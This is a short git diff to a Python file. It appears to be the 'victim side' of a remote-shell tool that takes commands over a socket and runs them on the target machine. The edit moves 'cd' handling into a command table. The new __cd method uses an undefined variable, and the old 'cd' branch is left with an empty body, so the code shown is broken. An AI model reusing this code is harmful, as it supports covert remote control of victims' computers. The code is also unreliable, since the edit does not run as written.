@@ -3,6 +3,7 @@ import subprocess
 import threading
 from glob import glob
 
+from src.modlues.CLI.commmad_executer import CommandExecuter
 from src.modlues.protocols.general import GeneralPacket, GeneralPacketType
 from src.modlues.protocols.protocol import HandelPacket, Packet, SendPacket, PacketType, PacketConstants
 from src.modlues.protocols.remote_shell import RemoteShellPacket, RemoteShellPacketType
@@ -14,6 +15,13 @@ class RemoteShellVictimSide:
         self.sock = sock
         self.is_connected = False
         self.last_cwd = ''
+
+        self.commands = dict()
+        self.commands = {
+            "cd": self.__cd
+        }
+
+        self.command_executer = CommandExecuter(self.commands)
 
     def main(self):
         self.__connect()
@@ -47,12 +55,18 @@ class RemoteShellVictimSide:
         SendPacket.send_packet(self.sock, packet)
         self.is_connected = False
 
+
+
+
+    def __cd(self):
+        os.chdir(f"{os.getcwd()}/{command[1]}")
+
     def __execute_and_capture(self, command: str):
 
         command = command.split(' ')
 
         if command[0] == 'cd':
-            os.chdir(command[1])
+
 
         if command[0] == "exitrsh":
             self.__disconnect()
